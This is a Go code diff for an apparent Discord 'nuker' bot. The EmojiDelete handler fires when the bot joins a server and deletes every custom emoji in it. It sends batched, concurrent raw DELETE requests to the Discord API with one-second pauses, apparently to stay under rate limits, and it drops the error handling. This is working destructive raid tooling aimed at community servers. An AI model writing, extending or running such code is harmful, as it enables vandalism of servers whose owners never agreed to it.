@@ -1,24 +1,34 @@
 package removing
 
 import (
-	"log"
+	"Inferno/core/requests"
+	"encoding/json"
+	"sync"
+	"time"
 
 	"github.com/bwmarrin/discordgo"
 )
 
 func EmojiDelete(s *discordgo.Session, event *discordgo.GuildCreate) {
-	emojis, err := s.GuildEmojis(event.ID)
+	emojis, _ := s.GuildEmojis(event.ID)
+	smoothed := requests.Smooth(emojis)
 
-	if err != nil {
-		log.Println(err)
-		return
-	}
+	for _, ch := range smoothed {
+		wg := new(sync.WaitGroup)
+		wg.Add(len(ch))
+		for _, emoji := range ch {
+			go func(emoji *discordgo.Emoji) {
+				defer wg.Done()
 
-	for _, emoji := range emojis {
-		err := s.GuildEmojiDelete(event.ID, emoji.ID)
-		if err != nil {
-			log.Println(err)
-			return
+				emojid := emoji.ID
+
+				data := []byte{}
+				jsonData, _ := json.Marshal(data)
+
+				requests.Sendhttp("https://discord.com/api/v9/guilds/"+event.ID+"/emojis/"+emojid, "DELETE", jsonData)
+			}(emoji)
 		}
+		wg.Wait()
+		time.Sleep(time.Second)
 	}
 }
